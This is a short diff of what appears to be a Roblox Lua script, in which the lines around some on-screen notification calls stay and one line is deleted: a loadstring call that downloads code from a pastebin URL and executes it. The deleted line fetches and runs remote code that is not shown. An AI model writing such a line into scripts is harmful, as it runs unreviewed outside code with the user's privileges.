@@ -357,7 +357,6 @@ game:GetService("StarterGui"):SetCore("SendNotification", {
 	Icon = "rbxthumb://type=Asset&id=9408318893&w=150&h=150"})
 Duration = 16;
 
-loadstring(game:HttpGet(('https://pastebin.com/raw/r0p74xjX'),true))()
 wait(3)
 
 game:GetService("StarterGui"):SetCore("SendNotification", { 
